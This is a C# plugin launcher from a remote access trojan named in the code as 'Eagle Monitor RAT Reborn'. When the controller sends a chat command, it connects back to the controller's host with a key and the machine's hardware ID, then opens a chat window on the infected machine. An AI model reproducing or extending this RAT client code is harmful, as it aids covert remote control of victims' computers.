using PacketLib;
using PacketLib.Packet;
using PacketLib.Utils;
using System.Threading;
using System.Windows.Forms;
using System;
using static Plugin.Imports;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin
{
    public static class Launch
    {
        internal static ClientHandler clientHandler;
        internal static string key;
        internal static string baseIp;
        internal static string HWID;

        internal static ChatForm chatForm;
        internal static Thread threadForm;

        public static void Main(LoadingAPI loadingAPI)
        {
            Launch.key = loadingAPI.key;
            Launch.baseIp = loadingAPI.baseIp;
            Launch.HWID = loadingAPI.HWID;

            switch (loadingAPI.currentPacket.packetType)
            {
                case PacketType.CHAT_ON:
                    clientHandler = new ClientHandler(loadingAPI.host, key);
                    clientHandler.ConnectStart();

                    while (clientHandler.Connected == false)
                        Thread.Sleep(100);

                    threadForm = new Thread(Launch.StartChatForm);
                    threadForm.SetApartmentState(ApartmentState.STA);
                    threadForm.Start();
                    break;

                default:
                    return;
            }
            Miscellaneous.CleanMemory();
        }

        internal static void StartChatForm()
        {
            Launch.chatForm = new ChatForm("Eagle Monitor RAT Reborn Chat");
            Launch.chatForm.InitializeComponent(); 
            Application.Run(chatForm);
        }

        internal static void StopChatForm() 
        {
            threadForm.Abort();
        }
    }
}
